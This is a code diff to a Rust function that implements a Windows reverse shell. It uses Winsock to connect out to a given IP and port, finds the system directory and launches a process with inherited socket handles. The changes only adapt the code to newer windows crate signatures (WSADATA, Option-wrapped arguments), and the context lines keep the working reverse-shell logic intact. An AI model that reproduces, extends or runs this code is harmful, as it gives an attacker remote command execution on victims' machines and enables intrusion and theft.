@@ -3,7 +3,7 @@ use std::{mem, ptr};
 use windows::core::{PCSTR, PSTR};
 use windows::Win32::Foundation::HANDLE;
 use windows::Win32::Networking::WinSock::{
-    connect, htons, inet_pton, WSAData, WSASocketA, WSAStartup, AF_INET, IPPROTO_TCP, SOCKADDR,
+    connect, htons, inet_pton, WSADATA, WSASocketA, WSAStartup, AF_INET, IPPROTO_TCP, SOCKADDR,
     SOCKADDR_IN, SOCKET, SOCK_STREAM,
 };
 use windows::Win32::Security::SECURITY_ATTRIBUTES;
@@ -20,7 +20,7 @@ pub fn shell(ip: &str, port: u16) {
     // Call WSAStartup so that you can do anything with sockets
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.WSAStartup.html
-    let wsa_start_result = unsafe { WSAStartup(WSASTARTUPVAL, &mut WSAData::default()) };
+    let wsa_start_result = unsafe { WSAStartup(WSASTARTUPVAL, &mut WSADATA::default()) };
     if wsa_start_result != 0 {
         panic!("Unable to call WSAStartup")
     }
@@ -33,7 +33,7 @@ pub fn shell(ip: &str, port: u16) {
             AF_INET.0 as i32,
             SOCK_STREAM as i32,
             IPPROTO_TCP.0,
-            ptr::null(),
+            None,
             0,
             0,
         )
@@ -79,7 +79,7 @@ pub fn shell(ip: &str, port: u16) {
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/SystemInformation/fn.GetSystemDirectoryA.html
     let lp_buffer: &mut [u8] = &mut [0; 50];
-    unsafe { GetSystemDirectoryA(lp_buffer) };
+    unsafe { GetSystemDirectoryA(Some(lp_buffer)) };
     let system_dir = unsafe { CStr::from_ptr(lp_buffer.as_ptr() as *const i8) };
     let system_dir = system_dir.to_str().unwrap();
 
@@ -105,8 +105,8 @@ pub fn shell(ip: &str, port: u16) {
         CreateProcessA(
             PCSTR::null(),
             lp_command_line,
-            &SECURITY_ATTRIBUTES::default(),
-            &SECURITY_ATTRIBUTES::default(),
+            Some(&SECURITY_ATTRIBUTES::default()),
+            Some(&SECURITY_ATTRIBUTES::default()),
             true,
             PROCESS_CREATION_FLAGS::default(),
             ptr::null(),
